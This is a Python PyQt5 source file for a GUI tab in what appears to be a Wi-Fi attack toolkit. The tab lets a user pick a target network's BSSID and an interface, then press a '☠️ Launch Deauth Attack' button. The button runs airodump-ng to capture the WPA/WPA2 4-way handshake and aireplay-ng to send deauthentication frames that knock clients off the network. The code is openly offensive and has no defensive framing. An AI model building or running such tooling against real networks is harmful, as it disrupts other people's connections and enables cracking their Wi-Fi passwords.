from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                               QPushButton, QComboBox, QGroupBox, QFormLayout, 
                               QTextEdit)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont
from modules.handshake_capture import HandshakeCapture

class HandshakeTab(QWidget):
    def __init__(self):
        super().__init__()
        self.setup_ui()
        
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(40, 40, 40, 40)
        layout.setSpacing(25)
        
        header_label = QLabel("Handshake Capture (Deauth)")
        header_label.setFont(QFont("Segoe UI", 22, QFont.Bold))
        layout.addWidget(header_label)
        
        guide_label = QLabel("Step 2: Disconnect clients to capture the 4-way WPA/WPA2 handshake.")
        guide_label.setFont(QFont("Segoe UI", 12))
        guide_label.setStyleSheet("color: #a0a0a0; margin-bottom: 20px;")
        layout.addWidget(guide_label)
        
        target_group = QGroupBox("Target Selection")
        target_group.setStyleSheet("QGroupBox { font-size: 14px; font-weight: bold; border: 1px solid #3d3d3d; border-radius: 6px; margin-top: 10px; } QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }")
        target_layout = QFormLayout(target_group)
        
        self.combo_target = QComboBox()
        self.combo_target.setFixedHeight(35)
        self.combo_target.addItems(["Select a target...", "AA:BB:CC:DD:EE:FF - TestNetwork", "11:22:33:44:55:66 - TargetNet_5G"])
        
        self.combo_interface = QComboBox()
        self.combo_interface.setFixedHeight(35)
        self.combo_interface.addItems(["wlan0", "wlan1"])
        
        target_layout.addRow(QLabel("Target BSSID:"), self.combo_target)
        target_layout.addRow(QLabel("Capture Interface:"), self.combo_interface)
        layout.addWidget(target_group)
        
        controls_layout = QHBoxLayout()
        self.btn_capture = QPushButton("☠️ Launch Deauth Attack")
        self.btn_capture.setFixedWidth(220)
        self.btn_capture.setFixedHeight(45)
        self.btn_capture.setStyleSheet("background-color: #f44336; color: white; font-weight: bold; font-size: 14px; border-radius: 6px;")
        self.btn_capture.clicked.connect(self.launch_attack)
        
        controls_layout.addWidget(self.btn_capture)
        controls_layout.addStretch()
        layout.addLayout(controls_layout)
        
        self.terminal_output = QTextEdit()
        self.terminal_output.setReadOnly(True)
        self.terminal_output.setStyleSheet("background-color: #0c0c0c; color: #4af626; font-family: Consolas, monospace; font-size: 13px; border: 1px solid #3d3d3d; padding: 10px;")
        self.terminal_output.setText("Waiting for attack launch (Option B Backend)...")
        layout.addWidget(self.terminal_output)

    def launch_attack(self):
        target = self.combo_target.currentText()
        if "Select" in target:
            self.terminal_output.append("[!] Error: No target selected.")
            return
            
        bssid = target.split(" ")[0]
        interface = self.combo_interface.currentText()
        
        self.terminal_output.append(f"[*] Executing target: airodump-ng --bssid {bssid} -c 6 --write captures/handshake {interface}")
        try:
            HandshakeCapture.start_capture(interface, bssid, 6, "captures/handshake")
            self.terminal_output.append(f"[+] airodump-ng process spawned.")
            
            self.terminal_output.append(f"[*] Executing target: aireplay-ng --deauth 15 -a {bssid} {interface}")
            HandshakeCapture.send_deauth(interface, bssid, 15)
            self.terminal_output.append("[+] aireplay-ng deauth attack launched successfully.")
        except Exception as e:
            self.terminal_output.append(f"[!] Core execution error (Requires Linux/WSL and aircrack-ng): {e}")

